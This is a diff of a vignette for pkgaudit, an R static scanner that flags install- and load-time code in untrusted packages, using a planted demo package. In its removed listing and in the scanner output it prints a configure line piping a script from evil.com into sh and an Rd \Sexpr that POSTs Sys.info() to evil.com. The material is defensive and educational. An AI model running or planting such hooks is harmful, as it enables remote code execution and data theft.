@@ -68,21 +68,22 @@
 
     
     
-<p>pkgaudit reports which parts of an R package can execute, when they
-execute, and what they do, so that an untrusted package can be reviewed
-before it is installed and loaded. It never executes the code it
-scans.</p>
-<p>A finding is not an accusation. <code>configure</code> scripts and
-calls to system tools, for example, are often legitimate. pkgaudit helps
-to identify what deserves reviewer attention, not what is malicious.</p>
+<p>pkgaudit scans R packages for security-relevant files and code
+without executing anything it scans. It reports what code does and when
+it runs, so code that runs on install or load is distinguishable from
+code that runs only when called.</p>
+<p>A finding is not an accusation. Nearly all of the patterns and
+matches flagged by pkgaudit have legitimate uses in R packages. pkgaudit
+helps to identify what deserves reviewer attention, not what is
+malicious.</p>
 <div class="sourceCode" id="cb1"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://github.com/tylerjssmith/pkgaudit" class="external-link">pkgaudit</a></span><span class="op">)</span></span></code></pre></div>
 <div class="section level2">
 <h2 id="example-package">Example package<a class="anchor" aria-label="anchor" href="#example-package"></a>
 </h2>
 <p><code>untrustedpkg</code> is a small source package shipped with
-pkgaudit. It is never built, checked, installed, or loaded; it exists
-only to be scanned.</p>
+pkgaudit for demonstration. It is never built, checked, installed, or
+loaded; it exists only to be scanned.</p>
 <div class="sourceCode" id="cb2"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">tarball</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/system.file.html" class="external-link">system.file</a></span><span class="op">(</span></span>
 <span>  <span class="st">"extdata"</span>, <span class="st">"untrustedpkg"</span>, <span class="st">"untrustedpkg_0.1.0.tar.gz"</span>,</span>
@@ -91,75 +92,39 @@ only to be scanned.</p>
 <span></span>
 <span><span class="va">exdir</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/file.path.html" class="external-link">file.path</a></span><span class="op">(</span><span class="fu"><a href="https://rdrr.io/r/base/tempfile.html" class="external-link">tempdir</a></span><span class="op">(</span><span class="op">)</span>, <span class="st">"untrustedpkg-example"</span><span class="op">)</span></span>
 <span><span class="fu">utils</span><span class="fu">::</span><span class="fu"><a href="https://rdrr.io/r/utils/untar.html" class="external-link">untar</a></span><span class="op">(</span><span class="va">tarball</span>, exdir <span class="op">=</span> <span class="va">exdir</span><span class="op">)</span></span>
-<span></span>
-<span><span class="va">pkg</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/file.path.html" class="external-link">file.path</a></span><span class="op">(</span><span class="va">exdir</span>, <span class="st">"untrustedpkg"</span><span class="op">)</span></span>
-<span><span class="fu"><a href="https://rdrr.io/r/base/list.files.html" class="external-link">list.files</a></span><span class="op">(</span><span class="va">pkg</span>, recursive <span class="op">=</span> <span class="cn">TRUE</span><span class="op">)</span></span>
-<span><span class="co">#&gt; [1] "configure"         "DESCRIPTION"       "man/fetch_data.Rd"</span></span>
-<span><span class="co">#&gt; [4] "R/fetch.R"         "R/zzz.R"</span></span></code></pre></div>
-<p>A <code>configure</code> script is a shell script that R runs when a
-package is installed from source, before any of its R code is
-loaded:</p>
-<pre><code>#!/bin/sh
-echo configuring
-curl -s https://www.evil.com/evil.sh | sh</code></pre>
-<p><code>R/zzz.R</code> defines <code>.onLoad()</code>, a hook R calls
-when the namespace is loaded:</p>
-<pre><code><span><span class="va">.onLoad</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">libname</span>, <span class="va">pkgname</span><span class="op">)</span> <span class="op">{</span></span>
-<span>  <span class="fu"><a href="https://rdrr.io/r/base/system.html" class="external-link">system</a></span><span class="op">(</span><span class="st">"uname -a"</span><span class="op">)</span></span>
-<span><span class="op">}</span></span></code></pre>
-<p><code>R/fetch.R</code> defines an ordinary function:</p>
-<pre><code><span><span class="va">fetch_data</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">url</span><span class="op">)</span> <span class="op">{</span></span>
-<span>  <span class="fu"><a href="https://rdrr.io/r/utils/download.file.html" class="external-link">download.file</a></span><span class="op">(</span><span class="va">url</span>, <span class="fu"><a href="https://rdrr.io/r/base/tempfile.html" class="external-link">tempfile</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
-<span><span class="op">}</span></span></code></pre>
-<p>A help file can carry R code in two places that run at different
-times. An <code>\examples{}</code> block runs under
-<code>R CMD check</code>. An <code>\Sexpr{}</code> macro runs whenever
-the page is rendered, which includes <code>R CMD build</code>,
-<code>R CMD check</code>, and installation from source:</p>
-<pre><code>\name{fetch_data}
-\alias{fetch_data}
-\title{Fetch Data From a URL}
-\description{
-  Downloads the contents of \code{url} to a temporary file.
-  \Sexpr[results=hide]{httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()))}
-}
-\usage{fetch_data(url)}
-\arguments{\item{url}{A URL to download.}}
-\examples{
-download.file("https://www.evil.com/data.csv", tempfile())
-}</code></pre>
+<span><span class="va">pkg</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/file.path.html" class="external-link">file.path</a></span><span class="op">(</span><span class="va">exdir</span>, <span class="st">"untrustedpkg"</span><span class="op">)</span></span></code></pre></div>
+<p><code>untrustedpkg</code> contains the following files.</p>
+<pre><code>[1] "configure"         "DESCRIPTION"       "man/fetch_data.Rd"
+[4] "R/fetch.R"         "R/zzz.R"          </code></pre>
 <p>The script that generates this package is in <a href="https://github.com/tylerjssmith/pkgaudit/blob/main/data-raw/create_untrustedpkg.R" class="external-link">data-raw/create_untrustedpkg.R</a>.</p>
 </div>
 <div class="section level2">
 <h2 id="auditing-a-package">Auditing a package<a class="anchor" aria-label="anchor" href="#auditing-a-package"></a>
 </h2>
-<p><code><a href="../reference/audit_package.html">audit_package()</a></code> scans an unpacked source package.
-Printing the result gives the scan metadata and the number of findings
+<p><code><a href="../reference/audit_package.html">audit_package()</a></code> scans an untarred source package.
+<code><a href="https://rdrr.io/r/base/print.html" class="external-link">print()</a></code> gives the scan metadata and the number of findings
 by category.</p>
-<div class="sourceCode" id="cb7"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">result</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/audit_package.html">audit_package</a></span><span class="op">(</span><span class="va">pkg</span><span class="op">)</span></span>
-<span></span>
-<span><span class="fu"><a href="https://rdrr.io/r/base/print.html" class="external-link">print</a></span><span class="op">(</span><span class="va">result</span><span class="op">)</span></span>
+<span><span class="fu"><a href="https://rdrr.io/r/base/print.html" class="external-link">print</a></span><span class="op">(</span><span class="va">result</span>, path <span class="op">=</span> <span class="cn">FALSE</span><span class="op">)</span></span>
 <span><span class="co">#&gt; --- pkgaudit ----------------------------------------------------------------</span></span>
 <span><span class="co">#&gt; Package:   untrustedpkg v0.1.0 (source directory)</span></span>
-<span><span class="co">#&gt; Path:      /tmp/RtmpHVNiNu/untrustedpkg-example/untrustedpkg</span></span>
 <span><span class="co">#&gt; SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171</span></span>
-<span><span class="co">#&gt; Scanned:   2026-08-26 22:51 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
+<span><span class="co">#&gt; Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
 <span><span class="co">#&gt; </span></span>
 <span><span class="co">#&gt; File contexts:  1</span></span>
 <span><span class="co">#&gt; Patterns:       4</span></span>
 <span><span class="co">#&gt; Matches:        1</span></span>
 <span><span class="co">#&gt; Errors:         0</span></span></code></pre></div>
-<p><code><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary()</a></code> reports the findings themselves: how often
-each rule matched, split by the lifecycle phase the code runs in, with
-the MITRE ATT&amp;CK techniques the rule carries.</p>
-<div class="sourceCode" id="cb8"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary</a></span><span class="op">(</span><span class="va">result</span><span class="op">)</span></span>
+<p><code><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary()</a></code> reports the number of findings by rule by
+phase. It also provides MITRE ATT&amp;CK techniques associated with each
+rule.</p>
+<div class="sourceCode" id="cb5"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary</a></span><span class="op">(</span><span class="va">result</span>, path <span class="op">=</span> <span class="cn">FALSE</span><span class="op">)</span></span>
 <span><span class="co">#&gt; --- pkgaudit Summary --------------------------------------------------------</span></span>
 <span><span class="co">#&gt; Package:   untrustedpkg v0.1.0 (source directory)</span></span>
-<span><span class="co">#&gt; Path:      /tmp/RtmpHVNiNu/untrustedpkg-example/untrustedpkg</span></span>
 <span><span class="co">#&gt; SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171</span></span>
-<span><span class="co">#&gt; Scanned:   2026-08-26 22:51 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
+<span><span class="co">#&gt; Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
 <span><span class="co">#&gt; </span></span>
 <span><span class="co">#&gt; --- R Patterns --------------------------------------------------------------</span></span>
 <span><span class="co">#&gt; phase            rule            n   attck</span></span>
@@ -192,68 +157,123 @@ the MITRE ATT&amp;CK techniques the rule carries.</p>
 <span><span class="co">#&gt; </span></span>
 <span><span class="co">#&gt; --- Errors ------------------------------------------------------------------</span></span>
 <span><span class="co">#&gt; No exceptions were raised.</span></span></code></pre></div>
-<p>Both methods accept <code>path = FALSE</code>, which omits the local
-filesystem path. This matters when sharing results, since the path may
-reveal a username or directory layout.</p>
+<p>Phases overlap – building a package with vignettes, for example, also
+installs and loads it – and one occurrence is counted under every phase
+it runs in. The summary above reflects five findings, some counted under
+multiple phases. To see only what is known to run automatically at
+installation from source, for example, pass an argument to
+<code>phase</code>:</p>
+<div class="sourceCode" id="cb6"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary</a></span><span class="op">(</span><span class="va">result</span>, phase <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"at_install_src"</span><span class="op">)</span>, path <span class="op">=</span> <span class="cn">FALSE</span><span class="op">)</span></span>
+<span><span class="co">#&gt; --- pkgaudit Summary --------------------------------------------------------</span></span>
+<span><span class="co">#&gt; Package:   untrustedpkg v0.1.0 (source directory)</span></span>
+<span><span class="co">#&gt; SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171</span></span>
+<span><span class="co">#&gt; Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
+<span><span class="co">#&gt; Phases:    at_install_src</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; --- R Patterns --------------------------------------------------------------</span></span>
+<span><span class="co">#&gt; phase            rule     n   attck</span></span>
+<span><span class="co">#&gt; at_install_src   httr     1   T1041</span></span>
+<span><span class="co">#&gt; at_install_src   system   1   T1059.003 T1059.004</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; --- Shell / Make Matches ----------------------------------------------------</span></span>
+<span><span class="co">#&gt; phase            rule     n   attck</span></span>
+<span><span class="co">#&gt; at_install_src   curl     1   T1041 T1105</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; --- Coverage ----------------------------------------------------------------</span></span>
+<span><span class="co">#&gt; status    top_level   type    files   lines</span></span>
+<span><span class="co">#&gt; parsed    R/          R           2       6</span></span>
+<span><span class="co">#&gt; parsed    man/        Rd          1      12</span></span>
+<span><span class="co">#&gt; matched   .           shell       1       3</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; --- Errors ------------------------------------------------------------------</span></span>
+<span><span class="co">#&gt; No exceptions were raised.</span></span></code></pre></div>
+<p>Both <code><a href="https://rdrr.io/r/base/print.html" class="external-link">print()</a></code> and <code><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary()</a></code> accept
+<code>path = FALSE</code>, which omits the local filesystem path. This
+can matter when sharing results, since the path may reveal a username or
+directory layout.</p>
+</div>
+<div class="section level2">
+<h2 id="examining-results">Examining results<a class="anchor" aria-label="anchor" href="#examining-results"></a>
+</h2>
 <p>A <code>pkgaudit</code> object is a named list of ordinary data
 frames, plus scan metadata, so findings can be filtered, joined and
 reported on directly.</p>
-<div class="sourceCode" id="cb9"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb7"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/base/names.html" class="external-link">names</a></span><span class="op">(</span><span class="va">result</span><span class="op">)</span></span>
 <span><span class="co">#&gt; [1] "file_contexts" "patterns"      "matches"       "coverage"     </span></span>
 <span><span class="co">#&gt; [5] "errors"        "metadata"</span></span></code></pre></div>
-<p><code>file_contexts</code> reports files that are security-relevant
-in themselves, whatever they contain: R runs a <code>configure</code>
-script, so the script is worth a reviewer’s attention. A row carries the
-rule’s <code>message</code> and the lifecycle phases.</p>
-<div class="sourceCode" id="cb10"><pre class="downlit sourceCode r">
+<div class="section level3">
+<h3 id="file-contexts">File contexts<a class="anchor" aria-label="anchor" href="#file-contexts"></a>
+</h3>
+<p><code>$file_contexts</code> reports security-relevant files, whatever
+they contain: R runs a <code>configure</code> script, which can execute
+shell commands, so the script should be reviewed.</p>
+<div class="sourceCode" id="cb8"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">file_contexts</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"file_context"</span><span class="op">)</span><span class="op">]</span></span>
 <span><span class="co">#&gt;        rule file_context</span></span>
 <span><span class="co">#&gt; 3 configure    configure</span></span></code></pre></div>
-<p><code>patterns</code> holds security-relevant R calls, located by
-file, line and column, and records the code context each one sits in.
-Both <code>patterns</code> and <code>matches</code> also carry the
-rule’s <code>message</code>, its ATT&amp;CK techniques, and one logical
-column per lifecycle phase; those are omitted below to keep the output
-readable.</p>
-<p>Additionally, <code>guarded</code> is <code>TRUE</code> for code that
-ships but the lifecycle does not run, such as a <code>\dontrun{}</code>
-block or a vignette chunk marked <code>eval=FALSE</code>.
-<code>indirect</code> is <code>TRUE</code> where a call was made through
-the function’s name rather than the function, as in
-<code>do.call("system", ...)</code>; the finding is reported under the
-rule that owns the name, so filtering on <code>rule</code> finds every
-call to it however it was spelled.</p>
+</div>
+<div class="section level3">
+<h3 id="patterns">Patterns<a class="anchor" aria-label="anchor" href="#patterns"></a>
+</h3>
+<p><code>$patterns</code> reports security-relevant R calls, located by
+<code>file_context</code>, <code>line_number</code>, and
+<code>column_number</code>.</p>
+<div class="sourceCode" id="cb9"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"file_context"</span>, <span class="st">"line_number"</span>, <span class="st">"column_number"</span><span class="op">)</span><span class="op">]</span></span>
+<span><span class="co">#&gt;            rule      file_context line_number column_number</span></span>
+<span><span class="co">#&gt; 1 download_file         R/fetch.R           2             3</span></span>
+<span><span class="co">#&gt; 2        system           R/zzz.R           2             3</span></span>
+<span><span class="co">#&gt; 3 download_file man/fetch_data.Rd          11             1</span></span>
+<span><span class="co">#&gt; 4          httr man/fetch_data.Rd           6            30</span></span></code></pre></div>
+<p>Additionally, <code>code_context</code> indicates where code sits
+within a file. File and code context are used to determine the phases.
+<code>guarded</code> is <code>TRUE</code> when a call may be stopped
+from running in the expected phase, e.g., a <code>\dontrun{}</code>
+block or a vignette marked <code>eval=FALSE</code>.
+<code>indirect</code> is <code>TRUE</code> when a call is made through a
+function name, e.g., <code>do.call("system", ...)</code> instead of
+<code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code>.</p>
+<div class="sourceCode" id="cb10"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"code_context"</span>, <span class="st">"guarded"</span>, <span class="st">"indirect"</span><span class="op">)</span><span class="op">]</span></span>
+<span><span class="co">#&gt;            rule     code_context guarded indirect</span></span>
+<span><span class="co">#&gt; 1 download_file      in_function   FALSE    FALSE</span></span>
+<span><span class="co">#&gt; 2        system      onLoad_base   FALSE    FALSE</span></span>
+<span><span class="co">#&gt; 3 download_file      Rd_examples   FALSE    FALSE</span></span>
+<span><span class="co">#&gt; 4          httr Rd_Sexpr_install   FALSE    FALSE</span></span></code></pre></div>
+<p><code>preview</code> provides a snippet of the code and its
+surroundings that may allow reviewers to determine the relevance of a
+finding without opening the file.</p>
 <div class="sourceCode" id="cb11"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"file_context"</span>, <span class="st">"line_number"</span>, <span class="st">"code_context"</span>,</span>
-<span>                    <span class="st">"guarded"</span>, <span class="st">"indirect"</span>, <span class="st">"preview"</span><span class="op">)</span><span class="op">]</span></span>
-<span><span class="co">#&gt;            rule      file_context line_number     code_context guarded indirect</span></span>
-<span><span class="co">#&gt; 1 download_file         R/fetch.R           2      in_function   FALSE    FALSE</span></span>
-<span><span class="co">#&gt; 2        system           R/zzz.R           2      onLoad_base   FALSE    FALSE</span></span>
-<span><span class="co">#&gt; 3 download_file man/fetch_data.Rd          11      Rd_examples   FALSE    FALSE</span></span>
-<span><span class="co">#&gt; 4          httr man/fetch_data.Rd           6 Rd_Sexpr_install   FALSE    FALSE</span></span>
-<span><span class="co">#&gt;                                                                       preview</span></span>
-<span><span class="co">#&gt; 1                                              download.file(url, tempfile())</span></span>
-<span><span class="co">#&gt; 2                                                          system("uname -a")</span></span>
-<span><span class="co">#&gt; 3                  download.file("https://www.evil.com/data.csv", tempfile())</span></span>
-<span><span class="co">#&gt; 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...</span></span></code></pre></div>
-<p><code>matches</code> mirrors <code>patterns</code> but carries none
-of the three columns that come from a parse tree –
-<code>code_context</code>, <code>guarded</code>, and
-<code>indirect</code>. A shell script has no R parse tree to sit in, so
-a match is located by file and line alone.</p>
+<code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"preview"</span><span class="op">)</span><span class="op">]</span></span>
+<span><span class="co">#&gt; [1] "download.file(url, tempfile())"                                               </span></span>
+<span><span class="co">#&gt; [2] "system(\"uname -a\")"                                                         </span></span>
+<span><span class="co">#&gt; [3] "download.file(\"https://www.evil.com/data.csv\", tempfile())"                 </span></span>
+<span><span class="co">#&gt; [4] "httr::POST(\"https://www.evil.com/collect\", body = list(info = Sys.info()..."</span></span></code></pre></div>
+</div>
+<div class="section level3">
+<h3 id="matches">Matches<a class="anchor" aria-label="anchor" href="#matches"></a>
+</h3>
+<p><code>$matches</code> reports text matching regular expressions in
+shell and Make-like files. Its columns mirror <code>$patterns</code>,
+but it does not have <code>code_context</code>, <code>guarded</code>, or
+<code>indirect</code>.</p>
 <div class="sourceCode" id="cb12"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">matches</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"file_context"</span>, <span class="st">"line_number"</span>, <span class="st">"preview"</span><span class="op">)</span><span class="op">]</span></span>
 <span><span class="co">#&gt;   rule file_context line_number                                   preview</span></span>
 <span><span class="co">#&gt; 1 curl    configure           3 curl -s https://www.evil.com/evil.sh | sh</span></span></code></pre></div>
-<p><code>coverage</code> accounts for the files themselves, recording
-what pkgaudit made of each one: <code>parsed</code> for R, matched
-against its parse tree; <code>matched</code> for shell and Make-like
-files, matched as text; <code>exportable</code> for languages pkgaudit
-does not read, such as C and Python; <code>unexamined</code> for files
-it did not read, such as serialized <code>.rda</code> and
-<code>.rds</code> objects; and <code>error</code> where it tried to read
-a file and could not.</p>
+</div>
+<div class="section level3">
+<h3 id="coverage">Coverage<a class="anchor" aria-label="anchor" href="#coverage"></a>
+</h3>
+<p><code>$coverage</code> reports what pkgaudit made of each file it
+scanned: <code>parsed</code> for R, matched against its parse tree;
+<code>matched</code> for shell and Make-like files, matched as text;
+<code>exportable</code> for languages pkgaudit does not read, such as C
+and Python; <code>unexamined</code> for files it did not read, such as
+serialized <code>.rda</code> and <code>.rds</code> objects; and
+<code>error</code> where it tried to read a file and could not.</p>
 <div class="sourceCode" id="cb13"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">coverage</span><span class="op">[</span>, <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"file_context"</span>, <span class="st">"language"</span>, <span class="st">"status"</span>, <span class="st">"reason"</span>, <span class="st">"lines"</span><span class="op">)</span><span class="op">]</span></span>
 <span><span class="co">#&gt;        file_context language     status       reason lines</span></span>
@@ -262,9 +282,47 @@ a file and could not.</p>
 <span><span class="co">#&gt; 3           R/zzz.R        R     parsed         &lt;NA&gt;     3</span></span>
 <span><span class="co">#&gt; 4         configure    shell    matched         &lt;NA&gt;     3</span></span>
 <span><span class="co">#&gt; 5 man/fetch_data.Rd       Rd     parsed         &lt;NA&gt;    12</span></span></code></pre></div>
-<p>Coverage may not be complete. What the frame offers is not
-completeness but legibility: a clean result can be checked rather than
-trusted, because the scan says what it did not cover.</p>
+</div>
+<div class="section level3">
+<h3 id="errors">Errors<a class="anchor" aria-label="anchor" href="#errors"></a>
+</h3>
+<p><code>$errors</code> reports files that pkgaudit tried to read and
+could not, with information about what may have gone wrong. pkgaudit did
+not encounter errors when scanning <code>untrustedpkg</code>.</p>
+</div>
+<div class="section level3">
+<h3 id="metadata">Metadata<a class="anchor" aria-label="anchor" href="#metadata"></a>
+</h3>
+<p><code>$metadata</code> is a list of metadata.</p>
+<div class="sourceCode" id="cb14"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">metadata</span></span>
+<span><span class="co">#&gt; $pkg_name</span></span>
+<span><span class="co">#&gt; [1] "untrustedpkg"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkg_version</span></span>
+<span><span class="co">#&gt; [1] "0.1.0"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkg_path</span></span>
+<span><span class="co">#&gt; [1] "/tmp/RtmpKnKV2F/untrustedpkg-example/untrustedpkg"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkg_is_tarball</span></span>
+<span><span class="co">#&gt; [1] FALSE</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkg_sha256</span></span>
+<span><span class="co">#&gt; [1] "50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkgaudit_version</span></span>
+<span><span class="co">#&gt; [1] "0.4.0"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkgaudit_rules_version</span></span>
+<span><span class="co">#&gt; [1] "0.4.0"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $pkgaudit_rules_sha256</span></span>
+<span><span class="co">#&gt; [1] "5fc1ec8e93232517679fb03df0f08020d844912e701615de7827666be2f6a7cd"</span></span>
+<span><span class="co">#&gt; </span></span>
+<span><span class="co">#&gt; $scanned</span></span>
+<span><span class="co">#&gt; [1] "2026-08-27T00:58:37Z"</span></span></code></pre></div>
+</div>
 <div class="section level3">
 <h3 id="subsetting-by-phase">Subsetting by phase<a class="anchor" aria-label="anchor" href="#subsetting-by-phase"></a>
 </h3>
@@ -274,131 +332,88 @@ trusted, because the scan says what it did not cover.</p>
 <code>at_load</code>, <code>at_attach</code>, <code>at_unload</code>,
 <code>at_detach</code>. A pattern inside an ordinary function is
 <code>FALSE</code> for all of them, since it runs only if something
-calls it.</p>
-<div class="sourceCode" id="cb14"><pre class="downlit sourceCode r">
+calls it. These can be used to subset the data frames and see what
+findings apply to each phase. For example, to see what is known to run
+when <code>untrustedpkg</code> is loaded:</p>
+<div class="sourceCode" id="cb15"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">[</span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">$</span><span class="va">at_load</span>,</span>
 <span>                <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"file_context"</span>, <span class="st">"code_context"</span><span class="op">)</span><span class="op">]</span></span>
 <span><span class="co">#&gt;     rule file_context code_context</span></span>
 <span><span class="co">#&gt; 2 system      R/zzz.R  onLoad_base</span></span></code></pre></div>
-<p><code><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary()</a></code> takes a <code>phase</code> argument for the
-same purpose, including <code>"none"</code> for findings pkgaudit could
-not attribute to any phase. Under <code>R/</code> that is code inside a
-function definition, which the rules report as running nowhere because
-<code>R/</code> is dominated by exported functions the lifecycle never
-calls. It is not a claim that this package never calls them: pkgaudit
-does not trace call graphs.</p>
-<div class="sourceCode" id="cb15"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/base/summary.html" class="external-link">summary</a></span><span class="op">(</span><span class="va">result</span>, phase <span class="op">=</span> <span class="st">"at_load"</span>, path <span class="op">=</span> <span class="cn">FALSE</span><span class="op">)</span></span>
-<span><span class="co">#&gt; --- pkgaudit Summary --------------------------------------------------------</span></span>
-<span><span class="co">#&gt; Package:   untrustedpkg v0.1.0 (source directory)</span></span>
-<span><span class="co">#&gt; SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171</span></span>
-<span><span class="co">#&gt; Scanned:   2026-08-26 22:51 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
-<span><span class="co">#&gt; Phases:    at_load</span></span>
-<span><span class="co">#&gt; </span></span>
-<span><span class="co">#&gt; --- R Patterns --------------------------------------------------------------</span></span>
-<span><span class="co">#&gt; phase     rule     n   attck</span></span>
-<span><span class="co">#&gt; at_load   system   1   T1059.003 T1059.004</span></span>
-<span><span class="co">#&gt; </span></span>
-<span><span class="co">#&gt; --- Shell / Make Matches ----------------------------------------------------</span></span>
-<span><span class="co">#&gt; No matches were found.</span></span>
-<span><span class="co">#&gt; </span></span>
-<span><span class="co">#&gt; --- Coverage ----------------------------------------------------------------</span></span>
-<span><span class="co">#&gt; No files were found.</span></span>
-<span><span class="co">#&gt; </span></span>
-<span><span class="co">#&gt; --- Errors ------------------------------------------------------------------</span></span>
-<span><span class="co">#&gt; No exceptions were raised.</span></span></code></pre></div>
-<p>Phases overlap: building a package with vignettes also installs and
-loads it, so one occurrence is counted under every phase it runs in.</p>
 </div>
 </div>
 <div class="section level2">
 <h2 id="reviewing-findings">Reviewing findings<a class="anchor" aria-label="anchor" href="#reviewing-findings"></a>
 </h2>
-<p><code>untrustedpkg</code> returns six findings: one file context,
-four patterns, and one match.</p>
+<p>pkgaudit is a guide to human review, not a substitute for human
+judgment. Below we consider the four patterns and one match for
+<code>untrustedpkg</code>.</p>
+<div class="section level3">
+<h3 id="patterns-1">Patterns<a class="anchor" aria-label="anchor" href="#patterns-1"></a>
+</h3>
 <ol style="list-style-type: decimal">
-<li><p><strong><code><a href="https://rdrr.io/r/utils/download.file.html" class="external-link">download.file()</a></code> in <code>R/fetch.R</code>
-runs at no phase.</strong> It sits in the body of
-<code>fetch_data()</code>, so it executes only if a user calls that
-function. A package that downloads a file when asked to download a file
-is doing its job. This is the baseline: a capability, disclosed in an
-exported function.</p></li>
-<li><p><strong><code><a href="https://rdrr.io/r/utils/download.file.html" class="external-link">download.file()</a></code> in
-<code>man/fetch_data.Rd</code> runs under
-<code>R CMD check</code>.</strong> The same call appears in the
-<code>\examples{}</code> block, so checking the package fetches the URL.
-Examples are meant to run, and a reviewer would weigh this as
-documentation that reaches the network rather than as an
-attack.</p></li>
-<li><p><strong><code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code> in <code>R/zzz.R</code> runs on
-<code><a href="https://rdrr.io/r/base/library.html" class="external-link">library()</a></code>.</strong> <code>.onLoad()</code> is called when
-the namespace loads, so <code>system("uname -a")</code> executes on
-<code><a href="https://rdrr.io/r/base/library.html" class="external-link">library()</a></code> – which loads before it attaches – and again at
-build, check, and installation from source, each of which loads the
-package. Nobody asked for it. The command itself is reconnaissance
-rather than damage, but the capability is arbitrary shell execution at
-load time.</p></li>
